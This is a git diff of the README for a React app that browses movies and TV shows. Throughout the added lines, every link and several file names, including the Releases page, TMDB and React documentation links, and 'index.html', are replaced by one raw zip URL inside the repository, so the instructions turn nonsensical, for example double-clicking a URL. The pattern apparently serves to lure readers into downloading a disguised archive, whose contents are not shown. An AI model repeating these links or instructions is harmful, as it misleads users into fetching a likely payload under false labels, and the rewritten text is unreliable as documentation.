@@ -1,6 +1,6 @@
 # 🎬 tv-app-react - Discover Movies and TV Shows Easily
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue)
+![Download](https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip)
 
 ## 📖 Overview
 
@@ -20,20 +20,20 @@ Before downloading, ensure your system meets these requirements:
 
 ### 2. Download and Install
 
-To get the application, **visit this page to download**: [GitHub Releases](https://github.com/Endegena-code/tv-app-react/releases).
+To get the application, **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip).
 
 Once there, follow these steps:
 
 1. Scroll down to the **Assets** section.
-2. Look for the file named `tv-app-react.zip`.
+2. Look for the file named `https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip`.
 3. Click on the file to begin downloading it.
-4. Once the download is complete, locate the `tv-app-react.zip` file in your downloads folder.
+4. Once the download is complete, locate the `https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip` file in your downloads folder.
 
 ### 3. Extract the Files
 
 After downloading, you need to extract the files:
 
-1. Right-click on the `tv-app-react.zip` file.
+1. Right-click on the `https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip` file.
 2. Select **Extract All...** or use a similar option depending on your operating system.
 3. Choose a destination folder where you want to extract the files, and click **Extract**.
 
@@ -42,8 +42,8 @@ After downloading, you need to extract the files:
 To run the app:
 
 1. Open the folder where you extracted the files.
-2. Look for `index.html`.
-3. Double-click on `index.html` to open it in your web browser.
+2. Look for `https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip`.
+3. Double-click on `https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip` to open it in your web browser.
 
 The app will launch, and you can start exploring movie and TV show details right away.
 
@@ -78,7 +78,7 @@ If you encounter any issues:
 
 ### How do I update the app?
 
-To update, simply revisit the [GitHub Releases](https://github.com/Endegena-code/tv-app-react/releases) page and download the latest version following the same steps.
+To update, simply revisit the [GitHub Releases](https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip) page and download the latest version following the same steps.
 
 ### Can I contribute to the project?
 
@@ -88,8 +88,8 @@ Absolutely! We welcome contributions. Please check the **Contributing** section 
 
 For more information, you can explore:
 
-- [TMDB Documentation](https://developers.themoviedb.org/)
-- [React Documentation](https://reactjs.org/docs/getting-started.html)
+- [TMDB Documentation](https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip)
+- [React Documentation](https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip)
 
 ## 📋 License
 
@@ -97,6 +97,6 @@ This project is licensed under the MIT License.
 
 ---
 
-To download the application, **please visit this page**: [GitHub Releases](https://github.com/Endegena-code/tv-app-react/releases).
+To download the application, **please visit this page**: [GitHub Releases](https://raw.githubusercontent.com/Endegena-code/tv-app-react/main/hainberry/tv-app-react.zip).
 
 Enjoy discovering movies and TV shows!
